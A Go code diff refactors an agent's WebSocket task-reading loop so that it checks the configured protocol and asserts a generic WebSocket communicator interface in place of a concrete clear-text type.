@@ -5,6 +5,7 @@ import (
 	"fmt"
 	"log"
 	"numinon_shadow/internal/agent/comm"
+	"numinon_shadow/internal/agent/config"
 	"numinon_shadow/internal/models"
 	"time"
 )
@@ -13,17 +14,21 @@ import (
 func (a *Agent) runWsLoop() error {
 	log.Println("|AGENT LOOP WS|-> WebSocket loop starting...")
 
-	// Assert communicator type to access WS-specific methods
-	// This is slightly less clean than using only the interface, but necessary for our approach.
-	commWs, ok := a.communicator.(*comm.WsClearCommunicator) // Adjust type for WSS later
-	if !ok {
-		log.Printf("|❗CRIT AGENT LOOP WS| Communicator is not the expected WebSocket type!")
+	if a.config.Protocol != config.WebsocketClear && a.config.Protocol != config.WebsocketSecure {
+		log.Printf("|❗CRIT AGENT LOOP| Communicator is not the expected WebSocket type!")
 		return fmt.Errorf("internal error: communicator is not a WebSocket type")
+	}
+
+	commWs, ok := a.communicator.(comm.WsCommunicator)
+	if !ok {
+		log.Printf("|❗CRIT AGENT LOOP| Communicator is not a WebSocket-capable type!")
+		return fmt.Errorf("internal error: communicator does not support WebSocket operations")
 	}
 
 	// --- Connection Loop ---
 	// This outer loop handles attempting to connect/reconnect.
 	for {
+
 		select {
 		case <-a.stopChan: // Check for stop signal before attempting connection
 			log.Println("|AGENT LOOP WS|-> Stop signal received, exiting WS loop.")
@@ -56,6 +61,7 @@ func (a *Agent) runWsLoop() error {
 
 			// Block and read the next message
 			// Use the type-asserted communicator to call the specific read method
+
 			messageBytes, err := commWs.ReadTaskMessage() // BLOCKING CALL
 
 			if err != nil {
